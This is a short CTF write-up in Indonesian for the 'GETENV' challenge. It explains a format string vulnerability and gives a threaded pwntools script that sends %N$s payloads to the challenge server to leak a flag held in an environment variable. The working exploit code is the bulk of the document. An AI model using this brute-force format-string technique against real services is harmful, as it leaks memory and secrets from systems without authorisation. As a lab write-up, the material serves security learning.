# GETENV

Vulnerabiliy kali ini adalah format string vulnerability, dimana kita dapat me-leak flag yang terdapat di env-variable dengan cara bruteforce.

disini saya menggunakan parameter contoh `%1$s` , untuk meleak flag, itu kita lakukan berkali-kali sampai flagnya terlihat

```python
import pwn
import threading

# remove debug output
pwn.context.log_level = 'WARNING'

def brute_format_str(num, file):
    with pwn.remote('01.linux.challenges.ctf.thefewchosen.com', 58846) as r:
        try:
            payload = f"%{num}$s"
            p = r.recv(1000)
            p = r.sendline(payload)
            p = r.recv(1000)
        except:
            pass
    try:
        file.write(p)
    except:
        pass
        

with open("dump.txt", "ab") as f:
    for i in range(0,100):
        t = threading.Thread(target=brute_format_str, args=(i,f))
        t.start()
        if i % 10 == 0:
            t.join()
```